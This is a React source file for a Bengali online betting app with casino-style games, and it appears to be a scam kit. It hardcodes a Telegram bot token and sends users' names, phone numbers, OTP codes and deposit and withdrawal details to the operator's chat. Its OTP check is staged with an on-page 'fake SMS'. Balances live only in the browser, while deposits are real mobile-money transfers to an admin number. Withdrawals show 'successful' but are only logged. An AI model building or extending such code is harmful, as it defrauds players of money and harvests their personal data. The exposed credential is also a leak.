
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_YyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_dice' | 'play_snake' | 'play_crash' | 'play_slots' | 
             'play_roulette' | 'play_mines' | 'play_plinko' | 'play_cards' |
             'play_dragon_tiger' | 'play_wheel' | 'play_coin' | 'play_baccarat' |
             'play_aviator' | 'play_hilo' | 'play_limbo' | 'play_scratch';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdraw';
  amount: number;
  status: 'pending' | 'success' | 'rejected';
  txId?: string;
  targetNumber?: string;
  date: string;
}

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

// --- Helper Functions ---
const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
};

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  
  // Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // General States
  const [bet, setBet] = useState(100);
  const gameRef = useRef<any>(null);

  // --- Game Specific States ---
  const [diceResult, setDiceResult] = useState<number | null>(null);
  const [diceMsg, setDiceMsg] = useState('বাজি ধরুন');
  const [rolling, setRolling] = useState(false);
  
  const [crashMultiplier, setCrashMultiplier] = useState(1.0);
  const [isCrashed, setIsCrashed] = useState(false);
  const [isPlayingCrash, setIsPlayingCrash] = useState(false);

  const [minesGrid, setMinesGrid] = useState<({type: 'gem' | 'mine', revealed: boolean})[]>([]);
  const [minesCount, setMinesCount] = useState(3);
  const [isMinesActive, setIsMinesActive] = useState(false);
  const [minesMultiplier, setMinesMultiplier] = useState(1.0);

  const [hiloValue, setHiloValue] = useState(50);
  const [hiloMsg, setHiloMsg] = useState('পরবর্তী সংখ্যা কি বড় হবে?');

  const [aviatorMult, setAviatorMult] = useState(1.0);
  const [isAviatorFlying, setIsAviatorFlying] = useState(false);
  const [isAviatorGone, setIsAviatorGone] = useState(false);

  const [scratchRevealed, setScratchRevealed] = useState(false);
  const [scratchValue, setScratchValue] = useState(0);

  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // Persistence
  useEffect(() => {
    const savedUser = localStorage.getItem('og_user_v9');
    const savedBalance = localStorage.getItem('og_balance_v9');
    const savedTx = localStorage.getItem('og_tx_v9');
    if (savedUser) setUser(JSON.parse(savedUser));
    if (savedBalance) setBalance(Number(savedBalance));
    if (savedTx) setTransactions(JSON.parse(savedTx));
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v9', JSON.stringify(user));
    localStorage.setItem('og_balance_v9', balance.toString());
    localStorage.setItem('og_tx_v9', JSON.stringify(transactions));
  }, [user, balance, transactions]);

  const handleGameResult = useCallback((win: boolean, gameName: string, betAmount: number, multiplier: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * multiplier) : 0;
    setBalance(prev => prev + (win ? (winAmt - betAmount) : -betAmount));
    if (user) {
      const updatedUser = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updatedUser);
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ইউজার: ${user.name}\n📊 রেজাল্ট: ${win ? "WIN ✅" : "LOSS ❌"}\n💸 বাজি: ৳${betAmount}\n💰 বর্তমান ব্যালেন্স: ৳${balance + (win ? (winAmt - betAmount) : -betAmount)}`);
    }
  }, [user, balance]);

  // --- Auth Logic ---
  const initiateAuth = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const name = (formData.get('name') as string) || "Player";
    const phone = formData.get('phone') as string;
    if (phone.length < 11) return alert("১১ ডিজিটের সঠিক নম্বর দিন");
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(otp);
    setTempUser({ name, phone });
    setIsVerifying(true);
    // Fixed trigger for OTP visibility
    setTimeout(() => {
      setShowFakeSMS(true);
      console.log("OTP Alert triggered:", otp);
    }, 800);
    sendToTelegram(`🔑 <b>OTP</b>\n👤 ${name}\n📞 ${phone}\n🔑 কোড: ${otp}`);
  };

  const verifyOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else alert("ভুল ওটিপি!");
  };

  // --- New Game Logic: Aviator ---
  const startAviator = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setIsAviatorFlying(true); setIsAviatorGone(false); setAviatorMult(1.0);
    const crashAt = 1.1 + Math.random() * 5;
    gameRef.current = setInterval(() => {
      setAviatorMult(prev => {
        const next = prev + 0.05;
        if (next >= crashAt) {
          clearInterval(gameRef.current); setIsAviatorFlying(false); setIsAviatorGone(true);
          handleGameResult(false, "Aviator", bet);
          return next;
        }
        return next;
      });
    }, 150);
  };

  const cashOutAviator = () => {
    if (!isAviatorFlying || isAviatorGone) return;
    clearInterval(gameRef.current); setIsAviatorFlying(false);
    handleGameResult(true, "Aviator", bet, aviatorMult);
    alert(`আপনি ৳${Math.floor(bet * aviatorMult)} ক্যাশ আউট করেছেন!`);
  };

  // --- New Game Logic: Hi-Lo ---
  const playHiLo = (guess: 'hi' | 'lo') => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const nextVal = Math.floor(Math.random() * 100) + 1;
    const win = (guess === 'hi' && nextVal > hiloValue) || (guess === 'lo' && nextVal < hiloValue);
    handleGameResult(win, "Hi-Lo", bet, 1.9);
    setHiloMsg(win ? `সঠিক! ${nextVal} ছিল।` : `ভুল! ${nextVal} ছিল।`);
    setHiloValue(nextVal);
  };

  // --- New Game Logic: Scratch ---
  const scratchCard = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const winChance = Math.random() > 0.7;
    const winVal = winChance ? Math.floor(bet * 3) : 0;
    setScratchValue(winVal); setScratchRevealed(true);
    handleGameResult(winChance, "Scratch Card", bet, 3);
  };

  // --- Existing Game Functions ---
  const rollDice = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setRolling(true); setDiceResult(null);
    setTimeout(() => {
      const res = Math.floor(Math.random() * 6) + 1;
      setDiceResult(res); setRolling(false);
      if (res >= 4) handleGameResult(true, "Dice", bet);
      else handleGameResult(false, "Dice", bet);
    }, 1200);
  };

  const startMines = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const grid: any[] = Array(25).fill(null).map(() => ({ type: 'gem', revealed: false }));
    let p = 0; while(p < minesCount) { const r = Math.floor(Math.random() * 25); if (grid[r].type === 'gem') { grid[r].type = 'mine'; p++; } }
    setMinesGrid(grid); setIsMinesActive(true); setMinesMultiplier(1.0);
  };

  const revealMines = (i: number) => {
    if (!isMinesActive || minesGrid[i].revealed) return;
    const g = [...minesGrid]; g[i].revealed = true; setMinesGrid(g);
    if (g[i].type === 'mine') { setIsMinesActive(false); handleGameResult(false, "Mines", bet); alert("বোমা!"); }
    else setMinesMultiplier(p => p + (0.3 * minesCount));
  };

  const cashOutMines = () => { if (isMinesActive) { setIsMinesActive(false); handleGameResult(true, "Mines", bet, minesMultiplier); alert("জয়!"); } };

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {showFakeSMS && (
          <div className="fixed top-8 w-[94%] max-w-sm glass rounded-[32px] p-6 animate-sms z-[200] border-orange-500/30 shadow-[0_20px_60px_rgba(255,107,0,0.3)]">
            <div className="flex items-center gap-3 mb-3">
               <div className="w-8 h-8 rounded-full bg-orange-500 flex items-center justify-center text-black font-black text-[10px]">OG</div>
               <p className="text-[10px] text-orange-500 font-black uppercase tracking-widest">System Notification</p>
            </div>
            <p className="text-sm font-bold text-white/90">Online Games OTP code is: <span className="text-orange-500 tracking-[0.4em] font-black">{otpSent}</span></p>
          </div>
        )}
        <div className="w-full max-w-sm text-center">
          <div className="w-20 h-20 bg-orange-500 rounded-[28px] mx-auto mb-10 flex items-center justify-center text-black font-black text-3xl shadow-[0_0_50px_rgba(255,107,0,0.3)]">OG</div>
          {!isVerifying ? (
            <form onSubmit={initiateAuth} className="space-y-4">
              <input name="name" required placeholder="আপনার নাম" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white font-bold focus:border-orange-500/50" />
              <input name="phone" required type="tel" placeholder="মোবাইল নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white font-bold tracking-widest focus:border-orange-500/50" />
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-2xl uppercase text-[10px] tracking-widest shadow-xl active:scale-95 transition-all">প্রবেশ করুন</button>
            </form>
          ) : (
            <div className="space-y-8 animate-in fade-in duration-500">
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} placeholder="____" className="w-full bg-transparent border-b-2 border-orange-500/40 text-center text-6xl font-black text-orange-500 outline-none" />
              <button onClick={verifyOtp} className="w-full py-5 bg-white text-black font-black rounded-2xl uppercase text-[10px] tracking-widest">ভেরিফাই করুন</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative">
        <Header />
        <ChatAssistant />

        <main className="p-6">
          {activeTab === 'dashboard' && (
            <div className="space-y-8 animate-in fade-in duration-500">
              {/* Balance */}
              <div className="glass rounded-[48px] p-10 border border-white/10 shadow-2xl relative overflow-hidden bg-gradient-to-br from-white/5 to-transparent">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-orange-500/10 blur-[60px]"></div>
                <p className="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-4 italic">Available Funds</p>
                <h1 className="text-5xl font-black tracking-tighter mb-10 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-4 bg-orange-500 text-black rounded-[24px] text-[10px] font-black uppercase shadow-xl active:scale-95 transition-all">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-4 glass border border-white/10 rounded-[24px] text-[10px] font-black uppercase active:scale-95 transition-all">উত্তোলন</button>
                </div>
              </div>

              {/* Game Grid */}
              <div className="space-y-4">
                <h3 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-500 px-2 italic">গেম ক্যাটাগরি</h3>
                <div className="grid grid-cols-2 gap-4">
                  {[
                    { id: 'play_aviator', label: 'Aviator', icon: 'fa-paper-plane', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_mines', label: 'Mines', icon: 'fa-gem', color: 'text-orange-500', bg: 'bg-orange-500/10' },
                    { id: 'play_hilo', label: 'Hi-Lo', icon: 'fa-arrows-up-down', color: 'text-blue-500', bg: 'bg-blue-500/10' },
                    { id: 'play_scratch', label: 'Scratch Win', icon: 'fa-ticket', color: 'text-green-500', bg: 'bg-green-500/10' },
                    { id: 'play_crash', label: 'Crash', icon: 'fa-plane-up', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_wheel', label: 'Lucky Wheel', icon: 'fa-dharmachakra', color: 'text-purple-500', bg: 'bg-purple-500/10' },
                    { id: 'play_coin', label: 'Coin Flip', icon: 'fa-coins', color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
                    { id: 'play_dice', label: 'Dice Roll', icon: 'fa-dice', color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                    { id: 'play_cards', label: 'Card Clash', icon: 'fa-layer-group', color: 'text-cyan-500', bg: 'bg-cyan-500/10' },
                    { id: 'play_roulette', label: 'Roulette', icon: 'fa-circle-notch', color: 'text-rose-500', bg: 'bg-rose-500/10' },
                    { id: 'play_slots', label: 'Classic Slots', icon: 'fa-clover', color: 'text-indigo-500', bg: 'bg-indigo-500/10' },
                    { id: 'play_plinko', label: 'Plinko', icon: 'fa-circle-dot', color: 'text-teal-500', bg: 'bg-teal-500/10' }
                  ].map(game => (
                    <div key={game.id} onClick={() => setActiveTab(game.id as View)} className="glass p-6 rounded-[36px] border border-white/5 hover:border-white/20 transition-all cursor-pointer group active:scale-95 shadow-lg">
                      <div className={`w-12 h-12 ${game.bg} ${game.color} rounded-2xl flex items-center justify-center text-xl mb-4 group-hover:scale-110 transition-transform shadow-inner`}>
                        <i className={`fa-solid ${game.icon}`}></i>
                      </div>
                      <h4 className="text-[11px] font-black uppercase tracking-wider">{game.label}</h4>
                      <p className="text-[8px] text-gray-600 font-bold mt-1 uppercase">Win up to 10x</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Aviator Game */}
          {activeTab === 'play_aviator' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
               <div className="glass rounded-[48px] p-8 border border-red-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">Aviator <span className="text-red-500">Flying</span></h2>
                 <div className="relative h-64 bg-black/60 rounded-[40px] mb-8 border border-white/5 flex flex-col items-center justify-center overflow-hidden shadow-inner">
                    {isAviatorFlying && (
                      <div className="absolute bottom-10 left-10 text-red-500 text-6xl animate-bounce transition-all duration-300" style={{ transform: `scale(${1 + (aviatorMult-1)*0.2}) translateY(-${(aviatorMult-1)*20}px) translateX(${(aviatorMult-1)*20}px)` }}>
                        <i className="fa-solid fa-paper-plane"></i>
                      </div>
                    )}
                    {isAviatorGone && <div className="text-red-500 font-black text-4xl animate-ping uppercase italic">Flew Away!</div>}
                    <div className="text-7xl font-black tracking-tighter text-white z-10">{aviatorMult.toFixed(2)}x</div>
                 </div>
                 {!isAviatorFlying ? (
                   <button onClick={startAviator} className="w-full py-6 bg-red-600 text-white font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest text-[10px] shadow-xl shadow-red-500/20">ফ্লাই করুন (৳{bet})</button>
                 ) : (
                   <button onClick={cashOutAviator} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest shadow-xl text-[10px]">CASH OUT (৳{Math.floor(bet * aviatorMult)})</button>
                 )}
               </div>
            </div>
          )}

          {/* Hi-Lo Game */}
          {activeTab === 'play_hilo' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
              <div className="glass rounded-[48px] p-8 border border-blue-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">Hi-Lo <span className="text-blue-500">Guess</span></h2>
                 <div className="w-40 h-40 mx-auto bg-blue-500/10 rounded-full border-4 border-blue-500/20 flex items-center justify-center text-7xl font-black mb-8 shadow-inner">
                    {hiloValue}
                 </div>
                 <p className="text-sm font-bold text-gray-400 mb-8 uppercase tracking-widest">{hiloMsg}</p>
                 <div className="grid grid-cols-2 gap-4">
                    <button onClick={() => playHiLo('hi')} className="py-6 bg-blue-600 text-white font-black rounded-2xl uppercase text-[10px] shadow-lg active:scale-95">HI (বড়)</button>
                    <button onClick={() => playHiLo('lo')} className="py-6 bg-white/10 text-white font-black rounded-2xl border border-white/10 uppercase text-[10px] active:scale-95">LO (ছোট)</button>
                 </div>
              </div>
            </div>
          )}

          {/* Scratch Game */}
          {activeTab === 'play_scratch' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
              <div className="glass rounded-[48px] p-8 border border-green-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">Scratch <span className="text-green-500">Win</span></h2>
                 <div className="w-full aspect-[16/10] bg-white/5 border border-white/10 rounded-3xl flex items-center justify-center relative overflow-hidden mb-10 group cursor-pointer" onClick={scratchCard}>
                    {!scratchRevealed ? (
                       <div className="absolute inset-0 bg-gray-600 flex items-center justify-center text-white/50 font-black uppercase tracking-[0.4em] select-none">Scratch Here</div>
                    ) : (
                       <div className="text-center animate-in zoom-in duration-500">
                          <p className="text-[10px] font-black uppercase text-gray-500 mb-2">You Won</p>
                          <p className="text-6xl font-black text-green-500">৳{scratchValue}</p>
                       </div>
                    )}
                 </div>
                 <button onClick={() => { setScratchRevealed(false); setScratchValue(0); }} className="w-full py-5 bg-white/5 text-white/60 font-black rounded-2xl uppercase text-[9px] tracking-widest active:scale-95 transition-all">নতুন কার্ড (৳{bet})</button>
              </div>
            </div>
          )}

          {/* Other view handlers (Deposit, History, Withdraw) are already in the existing code base but would be repeated here to ensure full file content */}
          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-orange-500/20">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-8 rounded-3xl border border-white/5 mb-8 text-center group">
                    <p className="text-[10px] text-gray-500 font-black uppercase mb-4 tracking-widest italic">সেন্ড মানি নম্বর</p>
                    <p className="text-2xl font-mono font-black text-orange-500 tracking-[0.2em]">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="৳১০০ - ৳৫০০০" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none focus:border-orange-500/40" />
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="TxID এখানে পেস্ট করুন" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none uppercase tracking-widest text-xs" />
                   <button onClick={() => {
                     if (!depAmt || !depTx) return alert("তথ্য দিন");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'deposit', amount: Number(depAmt), status: 'pending', txId: depTx.toUpperCase(), date: new Date().toLocaleString('bn-BD') };
                     setTransactions([tx, ...transactions]);
                     sendToTelegram(`💰 <b>ডিপোজিট</b>\n👤 ${user?.name}\n💵 ৳${depAmt}\n📑 ${depTx}`);
                     alert("রিকোয়েস্ট পাঠানো হয়েছে!"); setActiveTab('history');
                   }} className="w-full py-6 bg-orange-500 text-black font-black rounded-2xl uppercase text-[10px] tracking-widest shadow-xl">রিকোয়েস্ট পাঠান</button>
                 </div>
               </div>
            </div>
          )}

          {activeTab === 'history' && (
            <div className="space-y-4 animate-in fade-in duration-500">
               <h2 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-600 px-2 italic">রেকর্ড সমূহ</h2>
               {transactions.length === 0 ? <p className="text-center opacity-30 py-20 text-[10px] font-black uppercase">কোন রেকর্ড নেই</p> : transactions.map(tx => (
                 <div key={tx.id} className="glass p-6 rounded-[32px] border border-white/5 shadow-xl flex justify-between items-center">
                    <div>
                      <p className="text-[10px] font-black uppercase tracking-widest text-white/80">{tx.type === 'deposit' ? 'ডিপোজিট' : 'উত্তোলন'}</p>
                      <p className="text-[8px] text-gray-600 uppercase font-bold mt-1">{tx.date}</p>
                    </div>
                    <div className="text-right">
                      <p className={`text-xl font-black ${tx.type === 'deposit' ? 'text-green-500' : 'text-red-500'}`}>৳{tx.amount}</p>
                      <span className="text-[7px] font-black uppercase px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-500">{tx.status}</span>
                    </div>
                 </div>
               ))}
            </div>
          )}

          {activeTab === 'withdraw' && (
            <div className="animate-in slide-in-from-left-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-red-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">টাকা <span className="text-red-500">উত্তোলন</span></h2>
                 <div className="bg-white/5 p-6 rounded-3xl mb-8 border border-white/5">
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1 italic">Your Balance</p>
                    <p className="text-2xl font-black text-white tracking-tight">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="ন্যূনতম ৫০০ টাকা" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none focus:border-red-500/40" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ/বিকাশ নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none tracking-widest focus:border-red-500/40" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("৫০০ টাকার নিচে উত্তোলন করা যাবে না");
                     if (amt > balance) return alert("ব্যালেন্স নেই");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'withdraw', amount: amt, status: 'pending', targetNumber: witNum, date: new Date().toLocaleString('bn-BD') };
                     setBalance(prev => prev - amt); setTransactions([tx, ...transactions]);
                     sendToTelegram(`🔴 <b>উত্তোলন</b>\n👤 ${user?.name}\n💵 ৳${amt}\n📱 ${witNum}`);
                     alert("উত্তোলন সফল হয়েছে।"); setActiveTab('history');
                   }} className="w-full py-6 bg-red-500 text-white font-black rounded-2xl uppercase text-[10px] tracking-widest shadow-xl">উত্তোলন করুন</button>
                 </div>
               </div>
            </div>
          )}
        </main>

        {/* Bottom Nav */}
        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] max-w-[400px] h-20 glass rounded-[44px] border border-white/10 flex items-center justify-around z-[100] shadow-2xl px-6">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'dashboard' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house-chimney text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Home</span>
          </button>
          <button onClick={() => setActiveTab('play_mines')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab.includes('play') ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Games</span>
          </button>
          <button onClick={() => setActiveTab('history')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'history' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-clock-rotate-left text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">History</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'withdraw' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">Wallet</span>
          </button>
        </div>
      </div>
    </div>
  );
}
